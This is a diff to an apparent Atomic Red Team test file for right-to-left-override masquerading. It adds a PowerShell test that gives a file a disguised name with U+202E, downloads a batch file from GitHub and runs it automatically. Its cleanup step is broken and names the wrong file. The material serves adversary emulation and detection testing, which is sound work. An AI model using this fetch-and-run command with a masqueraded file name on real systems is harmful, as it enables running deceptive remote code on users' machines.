@@ -1,8 +1,8 @@
-- name: 'Masquerading: Right-to-Left Override'
-  description: |-
-    Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.[1]
 
-    Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.[2][3] RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.
+
+- name: 'Masquerading: Right-to-Left Override Batch File Creation and Execution'
+  description: |-
+    Creates a batch file
   supported_platforms:
     - windows
   input_arguments:
@@ -45,4 +45,27 @@
       Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
     name: powershell
     elevation_required: false
-    
+
+- name: 'Masquerading: RTLO Masqueraded File Download and Execution'
+  description: Downloads a batch file that has an obfuscated name utilizing the RTLO operator. The batch file then runs automatically, opening a cmd window and then closing 5 seconds later
+  supported_platforms:
+    - windows
+  input_arguments:
+    fileloc:
+      type: path
+      default: '[System.IO.Path]::Combine($env:USERPROFILE, "Downloads")'
+      description: Location you want to download the file to. Default is the downloads folder
+  executor:
+    command: |-
+      $rtlo = [char]0x202E
+      $fileloc = Join-Path "#{fileloc}" ("evil_batch" + $rtlo + "fdp.bat")
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat" -OutFile $fileloc -UseBasicParsing
+      Start-Process -FilePath $fileloc
+    cleanup_command: |-
+      $rtlo = [char]0x202E
+      $fileloc = $fileloc = Join-Path "#{fileloc}" ("evil_file" + $rtlo + "fdp.bat")
+      Remove-Item = $fileloc
+    name: powershell
+    elevation_required: false
+
+
